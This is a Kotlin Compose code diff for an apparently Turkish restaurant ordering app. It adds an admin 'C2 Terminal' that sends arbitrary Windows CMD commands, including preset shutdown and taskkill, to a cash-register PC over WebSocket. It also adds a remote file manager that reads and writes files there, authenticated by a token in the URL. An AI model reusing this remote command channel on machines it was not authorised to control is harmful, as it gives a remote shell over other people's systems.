+                IconButton(onClick = siparisNotuDuzenleClick, modifier = Modifier.align(Alignment.CenterHorizontally).padding(top = 4.dp)) { androidx.compose.material3.Icon(Icons.Default.NoteAlt, contentDescription = null, tint = Color.Gray, modifier = Modifier.size(20.dp)) }
             }
             
             Divider(modifier = Modifier.padding(vertical = 12.dp), color = Color(0xFF424242))
@@ -1761,7 +1871,7 @@ fun AdisyonKarti(adisyon: Adisyon, tamamlandiClick: () -> Unit, kalemSilClick: (
 
                 Row(modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp).clickable { genisletilmisGruplar[grupAnahtari] = !isExpanded }, horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                     Column(modifier = Modifier.weight(1f)) {
-                        val detayText = if (ilkKalem.detay.equals("Standart", true) || ilkKalem.detay.isBlank()) "" else " (${ilkKalem.detay})"
+                        val detayText = if (ilkKalem.detay.equals("Standart", true) || ilkKalem.detay.isNullOrBlank()) "" else " (${ilkKalem.detay})"
                         Row(verticalAlignment = Alignment.CenterVertically) {
                             Text(text = "• ${adet}x ${ilkKalem.urunAd}$detayText", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = Color.White)
                             if (adet > 1) Text(text = if (isExpanded) "  ▲" else "  ▼", fontSize = 13.sp, color = Color.Gray)
@@ -1790,9 +1900,9 @@ fun AdisyonKarti(adisyon: Adisyon, tamamlandiClick: () -> Unit, kalemSilClick: (
                                     Text(text = "↳ 1x ${tekliKalem.urunAd}", fontSize = 13.sp, color = Color.LightGray)
                                     Row(verticalAlignment = Alignment.CenterVertically) {
                                         Text(text = "${tekliKalem.fiyat} ₺", fontSize = 13.sp, color = Color.Gray, modifier = Modifier.padding(end = 12.dp))
-                                        Box(modifier = Modifier.size(36.dp).background(Color(0xFF333333), RoundedCornerShape(8.dp)).clickable { notDuzenleClick(tekliKalem) }, contentAlignment = Alignment.Center) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Edit, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp)) }
+                                        Box(modifier = Modifier.size(36.dp).background(Color(0xFF333333), RoundedCornerShape(8.dp)).clickable { notDuzenleClick(tekliKalem) }, contentAlignment = Alignment.Center) { androidx.compose.material3.Icon(Icons.Default.Edit, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp)) }
                                         Spacer(modifier = Modifier.width(8.dp))
-                                        Box(modifier = Modifier.size(36.dp).background(Color(0xFF421515), RoundedCornerShape(8.dp)).clickable { kalemSilClick(tekliKalem) }, contentAlignment = Alignment.Center) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Close, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp)) }
+                                        Box(modifier = Modifier.size(36.dp).background(Color(0xFF421515), RoundedCornerShape(8.dp)).clickable { kalemSilClick(tekliKalem) }, contentAlignment = Alignment.Center) { androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp)) }
                                     }
                                 }
                             }
@@ -1803,12 +1913,12 @@ fun AdisyonKarti(adisyon: Adisyon, tamamlandiClick: () -> Unit, kalemSilClick: (
             }
 
             Spacer(modifier = Modifier.height(8.dp))
-            OutlinedButton(onClick = ilaveClick, modifier = Modifier.fillMaxWidth().height(56.dp), colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFF54E4E)), border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFF54E4E)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Add, contentDescription = null) }
+            OutlinedButton(onClick = ilaveClick, modifier = Modifier.fillMaxWidth().height(56.dp), colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFF54E4E)), border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFF54E4E)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(Icons.Default.Add, contentDescription = null) }
             Spacer(modifier = Modifier.height(12.dp))
             Row(modifier = Modifier.fillMaxWidth()) {
-                Button(onClick = yazdirClick, modifier = Modifier.weight(1f).height(64.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF424242)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Print, contentDescription = null) }
+                Button(onClick = yazdirClick, modifier = Modifier.weight(1f).height(64.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF424242)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(Icons.Default.Print, contentDescription = null) }
                 Spacer(modifier = Modifier.width(12.dp))
-                Button(onClick = tamamlandiClick, modifier = Modifier.weight(1f).height(64.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.DoneAll, contentDescription = null) }
+                Button(onClick = tamamlandiClick, modifier = Modifier.weight(1f).height(64.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)), shape = RoundedCornerShape(12.dp)) { androidx.compose.material3.Icon(Icons.Default.DoneAll, contentDescription = null) }
             }
         }
     }
@@ -2166,12 +2276,29 @@ fun AdminPanelScreen(onBack: () -> Unit) {
         }
     }
 
+    var showRemote by remember { mutableStateOf(false) }
+    
+    if (showRemote) {
+        RemoteTerminalScreen(onBack = { showRemote = false })
+        return
+    }
+
     Column(modifier = Modifier.fillMaxSize().background(Color(0xFF0F0F0F)).padding(16.dp)) {
         Row(verticalAlignment = Alignment.CenterVertically) {
             IconButton(onClick = onBack) {
-                androidx.compose.material3.Icon(androidx.compose.material.icons.Icons.Default.Close, contentDescription = "Geri", tint = Color.White)
+                androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = "Geri", tint = Color.White)
             }
-            Text("Admin Paneli - OCR Logları", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
+            Text("Admin Paneli", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
+        }
+        
+        Spacer(modifier = Modifier.height(16.dp))
+        
+        Button(
+            onClick = { showRemote = true },
+            modifier = Modifier.fillMaxWidth().height(50.dp),
+            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
+        ) {
+            Text("Uzak Yönetim (C2 Terminal)", color = Color.White, fontWeight = FontWeight.Bold)
         }
         
         Spacer(modifier = Modifier.height(16.dp))
@@ -2218,6 +2345,426 @@ fun AdminPanelScreen(onBack: () -> Unit) {
                         Column(modifier = Modifier.padding(16.dp)) {
                             Text(log["name"].toString(), color = Color.White, fontWeight = FontWeight.Bold)
                             Text("Boyut: ${log["size"].toString()} bytes", color = Color.Gray, fontSize = 12.sp)
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+@OptIn(ExperimentalMaterial3Api::class)
+@Composable
+fun RemoteTerminalScreen(onBack: () -> Unit) {
+    val context = LocalContext.current
+    val prefs = context.getSharedPreferences("SaracogluDefteri", Context.MODE_PRIVATE)
+    
+    var command by remember { mutableStateOf("") }
+    var output by remember { mutableStateOf("Kasa'ya bağlanılıyor...") }
+    var ws by remember { mutableStateOf<WebSocket?>(null) }
+    var connected by remember { mutableStateOf(false) }
+    val coroutineScope = rememberCoroutineScope()
+
+    LaunchedEffect(Unit) {
+        val ip = prefs.getString("KASA_IP", "")?.trim() ?: ""
+        val token = prefs.getString("KASA_TOKEN", "") ?: ""
+        val devId = prefs.getString("CIHAZ_ID", "") ?: ""
+        if (ip.isBlank()) {
+            output = "Hata: Kasa IP ayarlanmamış."
+            return@LaunchedEffect
+        }
+        
+        val termDevId = "${devId}-term"
+        
+        val wsUrl = if (ip.startsWith("https://")) {
+            ip.replace("https://", "wss://") + (if (ip.endsWith("/")) "ws?token=$token&deviceId=$termDevId" else "/ws?token=$token&deviceId=$termDevId")
+        } else if (ip.startsWith("http://")) {
+            ip.replace("http://", "ws://") + (if (ip.endsWith("/")) "ws?token=$token&deviceId=$termDevId" else "/ws?token=$token&deviceId=$termDevId")
+        } else if (ip.contains("bilalgnd.shop")) {
+            "wss://$ip/ws?token=$token&deviceId=$termDevId"
+        } else {
+            "ws://$ip/ws?token=$token&deviceId=$termDevId"
+        }
+
+        val client = OkHttpClient()
+        val request = Request.Builder().url(wsUrl).build()
+        val socket = client.newWebSocket(request, object : WebSocketListener() {
+            override fun onOpen(webSocket: WebSocket, response: Response) {
+                connected = true
+                output = "✅ Kasa sunucusuna bağlandı. Kasa'dan yanıt bekleniyor...\n"
+            }
+            override fun onMessage(webSocket: WebSocket, text: String) {
+                try {
+                    if (text.trim().startsWith("{")) {
+                        val jsonObj = JSONObject(text)
+                        if (jsonObj.has("type") && jsonObj.getString("type") == "remote_response") {
+                            val respOutput = jsonObj.getString("output")
+                            output += "\n> ${respOutput}"
+                        }
+                    }
+                } catch (e: Exception) {}
+            }
+            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+                connected = false
+                output += "\n🔴 Bağlantı koptu."
+            }
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                connected = false
+                output += "\n❌ Bağlantı hatası: ${t.message}"
+            }
+        })
+        ws = socket
+    }
+    
+    fun sendCommand(cmd: String) {
+        if (!connected) return
+        output += "\n$ $cmd"
+        val payload = JSONObject().apply {
+            put("type", "remote_command")
+            put("command", cmd)
+            put("commandId", System.currentTimeMillis().toString())
+            put("targetDeviceId", "KASA")
+        }
+        ws?.send(payload.toString())
+        command = ""
+    }
+
+    Column(modifier = Modifier.fillMaxSize().background(Color(0xFF0F0F0F)).padding(16.dp)) {
+        Row(verticalAlignment = Alignment.CenterVertically) {
+            IconButton(onClick = { ws?.close(1000, "User left"); onBack() }) {
+                androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = "Geri", tint = Color.White)
+            }
+            Text("Uzak Yönetim (C2 Terminal)", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
+        }
+        
+        Spacer(modifier = Modifier.height(16.dp))
+        
+        // Hazır Butonlar
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
+            Button(onClick = { sendCommand("dir") }, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)) { Text("Test (Dir)", color = Color.White) }
+            Button(onClick = { sendCommand("ipconfig") }, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)) { Text("IP Bilgisi", color = Color.White) }
+            Button(onClick = { sendCommand("type trendyol_siparis_loglari.txt") }, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)) { Text("Logları Oku", color = Color.White) }
+        }
+        
+        Spacer(modifier = Modifier.height(8.dp))
+        
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
+            Button(onClick = { sendCommand("shutdown /r /t 5") }, colors = ButtonDefaults.buttonColors(containerColor = Color.Red)) { Text("Kasayı Yeniden Başlat", color = Color.White) }
+            Button(onClick = { sendCommand("taskkill /F /IM SaracApp.exe") }, colors = ButtonDefaults.buttonColors(containerColor = Color.Red)) { Text("Uygulamayı Kapat", color = Color.White) }
+        }
+
+        Spacer(modifier = Modifier.height(16.dp))
+        
+        // Terminal Ekranı
+        val scrollState = rememberScrollState()
+        Box(modifier = Modifier.fillMaxWidth().weight(1f).background(Color(0xFF1E1E1E), RoundedCornerShape(8.dp)).padding(8.dp).verticalScroll(scrollState)) {
+            Text(output, color = Color(0xFF00FF00), fontFamily = FontFamily.Monospace, fontSize = 12.sp)
+        }
+        
+        Spacer(modifier = Modifier.height(16.dp))
+        
+        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
+            OutlinedTextField(
+                value = command,
+                onValueChange = { command = it },
+                modifier = Modifier.weight(1f),
+                placeholder = { Text("CMD komutu yaz...", color = Color.Gray) },
+                colors = androidx.compose.material3.OutlinedTextFieldDefaults.colors(
+                    focusedTextColor = Color(0xFF00FF00),
+                    unfocusedTextColor = Color(0xFF00FF00),
+                    focusedBorderColor = Color.DarkGray
+                )
+            )
+            Spacer(modifier = Modifier.width(8.dp))
+            Button(
+                onClick = { sendCommand(command) },
+                enabled = connected && command.isNotBlank(),
+                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50))
+            ) {
+                Text("Gönder", color = Color.White)
+            }
+        }
+    }
+}
+
+@OptIn(ExperimentalMaterial3Api::class)
+@Composable
+fun RemoteFileManagerScreen(onBack: () -> Unit) {
+    val context = LocalContext.current
+    val prefs = context.getSharedPreferences("SaracogluDefteri", Context.MODE_PRIVATE)
+    
+    var currentPath by remember { mutableStateOf("") }
+    var files by remember { mutableStateOf<List<JSONObject>>(emptyList()) }
+    var statusText by remember { mutableStateOf("Kasa'ya bağlanılıyor...") }
+    var ws by remember { mutableStateOf<WebSocket?>(null) }
+    var connected by remember { mutableStateOf(false) }
+    val coroutineScope = rememberCoroutineScope()
+    
+    // File Picker
+    val filePickerLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
+        contract = androidx.activity.result.contract.ActivityResultContracts.GetContent()
+    ) { uri: android.net.Uri? ->
+        if (uri != null) {
+            coroutineScope.launch(Dispatchers.IO) {
+                try {
+                    val inputStream = context.contentResolver.openInputStream(uri)
+                    val bytes = inputStream?.readBytes()
+                    inputStream?.close()
+                    if (bytes != null) {
+                        val base64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                        
+                        // Try to get filename
+                        var fileName = "upload_${System.currentTimeMillis()}"
+                        val cursor = context.contentResolver.query(uri, null, null, null, null)
+                        cursor?.use {
+                            if (it.moveToFirst()) {
+                                val nameIndex = it.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
+                                if (nameIndex >= 0) fileName = it.getString(nameIndex)
+                            }
+                        }
+                        
+                        val payload = JSONObject().apply {
+                            put("type", "remote_fs_write")
+                            put("commandId", System.currentTimeMillis().toString())
+                            put("targetDeviceId", "KASA")
+                            put("path", if (currentPath.isEmpty()) fileName else "$currentPath\$fileName")
+                            put("data", base64Data)
+                        }
+                        withContext(Dispatchers.Main) {
+                            statusText = "Yükleniyor..."
+                        }
+                        ws?.send(payload.toString())
+                    }
+                } catch (e: Exception) {
+                    withContext(Dispatchers.Main) {
+                        statusText = "Yükleme hatası: ${e.message}"
+                    }
+                }
+            }
+        }
+    }
+
+    LaunchedEffect(Unit) {
+        val ip = prefs.getString("KASA_IP", "")?.trim() ?: ""
+        val token = prefs.getString("KASA_TOKEN", "") ?: ""
+        val devId = prefs.getString("CIHAZ_ID", "") ?: ""
+        if (ip.isBlank()) {
+            statusText = "Hata: Kasa IP ayarlanmamış."
+            return@LaunchedEffect
+        }
+        
+        val termDevId = "${devId}-fm"
+        
+        val wsUrl = if (ip.startsWith("https://")) {
+            ip.replace("https://", "wss://") + (if (ip.endsWith("/")) "ws?token=$token&deviceId=$termDevId" else "/ws?token=$token&deviceId=$termDevId")
+        } else if (ip.startsWith("http://")) {
+            ip.replace("http://", "ws://") + (if (ip.endsWith("/")) "ws?token=$token&deviceId=$termDevId" else "/ws?token=$token&deviceId=$termDevId")
+        } else if (ip.contains("bilalgnd.shop")) {
+            "wss://$ip/ws?token=$token&deviceId=$termDevId"
+        } else {
+            "ws://$ip/ws?token=$token&deviceId=$termDevId"
+        }
+
+        val client = OkHttpClient()
+        val request = Request.Builder().url(wsUrl).build()
+        val socket = client.newWebSocket(request, object : WebSocketListener() {
+            override fun onOpen(webSocket: WebSocket, response: Response) {
+                connected = true
+                statusText = "Bağlandı. Dosyalar alınıyor..."
+                val payload = JSONObject().apply {
+                    put("type", "remote_fs_list")
+                    put("commandId", System.currentTimeMillis().toString())
+                    put("targetDeviceId", "KASA")
+                    put("path", "")
+                }
+                webSocket.send(payload.toString())
+            }
+            override fun onMessage(webSocket: WebSocket, text: String) {
+                try {
+                    if (text.trim().startsWith("{")) {
+                        val jsonObj = JSONObject(text)
+                        if (jsonObj.has("type") && jsonObj.getString("type") == "remote_fs_response") {
+                            val action = jsonObj.optString("action")
+                            if (action == "list") {
+                                currentPath = jsonObj.optString("currentPath", "")
+                                val dataObj = jsonObj.opt("data")
+                                if (dataObj is org.json.JSONArray) {
+                                    val list = mutableListOf<JSONObject>()
+                                    for (i in 0 until dataObj.length()) {
+                                        list.add(dataObj.getJSONObject(i))
+                                    }
+                                    list.sortBy { !it.optBoolean("isDirectory") }
+                                    files = list
+                                    statusText = "Hazır ($currentPath)"
+                                } else {
+                                    statusText = "Liste okunamadı: ${jsonObj.optJSONObject("data")?.optString("error")}"
+                                }
+                            } else if (action == "read") {
+                                val error = jsonObj.optJSONObject("data")?.optString("error")
+                                if (error != null && error.isNotEmpty()) {
+                                    statusText = "Okuma hatası: $error"
+                                } else {
+                                    val base64Data = jsonObj.optString("data")
+                                    val fileName = jsonObj.optString("fileName", "downloaded_file")
+                                    val bytes = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT)
+                                    try {
+                                        val downloadsFolder = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
+                                        val file = java.io.File(downloadsFolder, fileName)
+                                        java.io.FileOutputStream(file).use { it.write(bytes) }
+                                        statusText = "Dosya İndirildi: ${file.absolutePath}"
+                                        
+                                        // Open it
+                                        val uri = androidx.core.content.FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
+                                        val intent = android.content.Intent(android.content.Intent.ACTION_VIEW)
+                                        intent.setDataAndType(uri, "*/*")
+                                        intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                        context.startActivity(intent)
+                                    } catch(e:Exception) {
+                                        statusText = "Kaydetme hatası: ${e.message}"
+                                    }
+                                }
+                            } else if (action == "write") {
+                                val error = jsonObj.optJSONObject("data")?.optString("error")
+                                if (error != null && error.isNotEmpty()) {
+                                    statusText = "Yükleme hatası: $error"
+                                } else {
+                                    statusText = "Dosya Yüklendi!"
+                                    // Refresh list
+                                    val payload = JSONObject().apply {
+                                        put("type", "remote_fs_list")
+                                        put("commandId", System.currentTimeMillis().toString())
+                                        put("targetDeviceId", "KASA")
+                                        put("path", currentPath)
+                                    }
+                                    webSocket.send(payload.toString())
+                                }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    statusText = "Veri hatası: ${e.message}"
+                }
+            }
+            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+                connected = false
+                statusText = "Bağlantı koptu."
+            }
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                connected = false
+                statusText = "Bağlantı hatası: ${t.message}"
+            }
+        })
+        ws = socket
+    }
+    
+    Scaffold(
+        topBar = {
+            androidx.compose.material3.TopAppBar(
+                title = { Text("Uzak Dosya Yöneticisi", color = Color.White, fontSize = 18.sp) },
+                navigationIcon = {
+                    IconButton(onClick = { ws?.close(1000, "User left"); onBack() }) {
+                        androidx.compose.material3.Icon(Icons.Default.ArrowBack, contentDescription = "Geri", tint = Color.White)
+                    }
+                },
+                actions = {
+                    IconButton(onClick = {
+                        statusText = "Yenileniyor..."
+                        val payload = JSONObject().apply {
+                            put("type", "remote_fs_list")
+                            put("commandId", System.currentTimeMillis().toString())
+                            put("targetDeviceId", "KASA")
+                            put("path", currentPath)
+                        }
+                        ws?.send(payload.toString())
+                    }) {
+                        androidx.compose.material3.Icon(Icons.Default.Refresh, contentDescription = "Yenile", tint = Color.White)
+                    }
+                },
+                colors = androidx.compose.material3.TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF121212))
+            )
+        },
+        floatingActionButton = {
+            androidx.compose.material3.FloatingActionButton(
+                onClick = { filePickerLauncher.launch("*/*") },
+                containerColor = Color(0xFF4CAF50),
+                contentColor = Color.White
+            ) {
+                androidx.compose.material3.Icon(Icons.Default.Add, contentDescription = "Dosya Yükle")
+            }
+        }
+    ) { paddingValues ->
+        Column(modifier = Modifier.fillMaxSize().background(Color(0xFF0F0F0F)).padding(paddingValues).padding(8.dp)) {
+            
+            Text(statusText, color = Color(0xFF4CAF50), fontSize = 12.sp, modifier = Modifier.padding(bottom = 8.dp))
+            
+            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth().background(Color(0xFF1E1E1E), androidx.compose.foundation.shape.RoundedCornerShape(8.dp)).padding(8.dp)) {
+                IconButton(onClick = {
+                    val parentPath = currentPath.substringBeforeLast("\\", "").takeIf { it.isNotEmpty() } ?: currentPath.substringBeforeLast("/", "")
+                    val payload = JSONObject().apply {
+                        put("type", "remote_fs_list")
+                        put("commandId", System.currentTimeMillis().toString())
+                        put("targetDeviceId", "KASA")
+                        put("path", parentPath)
+                    }
+                    ws?.send(payload.toString())
+                }) {
+                    androidx.compose.material3.Icon(Icons.Default.KeyboardArrowUp, contentDescription = "Yukarı Çık", tint = Color.White)
+                }
+                Spacer(Modifier.width(8.dp))
+                Text(currentPath.ifEmpty { "Kök Dizin" }, color = Color.White, fontSize = 14.sp, maxLines = 1, modifier = Modifier.weight(1f))
+            }
+            
+            Spacer(Modifier.height(8.dp))
+            
+            androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.fillMaxSize()) {
+                items(files.size) { index ->
+                    val f = files[index]
+                    val isDir = f.optBoolean("isDirectory")
+                    val name = f.optString("name")
+                    val size = f.optLong("size")
+                    
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .padding(vertical = 4.dp)
+                            .background(Color(0xFF1E1E1E), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
+                            .clickable {
+                                if (isDir) {
+                                    val newPath = if (currentPath.isEmpty()) name else if (currentPath.contains("\\\\")) "$currentPath\\\\$name" else "$currentPath/$name"
+                                    val payload = JSONObject().apply {
+                                        put("type", "remote_fs_list")
+                                        put("commandId", System.currentTimeMillis().toString())
+                                        put("targetDeviceId", "KASA")
+                                        put("path", newPath)
+                                    }
+                                    ws?.send(payload.toString())
+                                } else {
+                                    statusText = "İndiriliyor: $name"
+                                    val targetFile = if (currentPath.isEmpty()) name else if (currentPath.contains("\\\\")) "$currentPath\\\\$name" else "$currentPath/$name"
+                                    val payload = JSONObject().apply {
+                                        put("type", "remote_fs_read")
+                                        put("commandId", System.currentTimeMillis().toString())
+                                        put("targetDeviceId", "KASA")
+                                        put("path", targetFile)
+                                    }
+                                    ws?.send(payload.toString())
+                                }
+                            }
+                            .padding(12.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        androidx.compose.material3.Icon(
+                            imageVector = if (isDir) Icons.Default.List else Icons.Default.Info,
+                            contentDescription = null,
+                            tint = if (isDir) Color(0xFFFFC107) else Color.Gray,
+                            modifier = Modifier.size(24.dp)
+                        )
+                        Spacer(Modifier.width(12.dp))
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text(name, color = Color.White, fontSize = 15.sp, maxLines = 1)
+                            if (!isDir) {
+                                Text("${size / 1024} KB", color = Color.Gray, fontSize = 12.sp)
+                            }
                         }
                     }
                 }
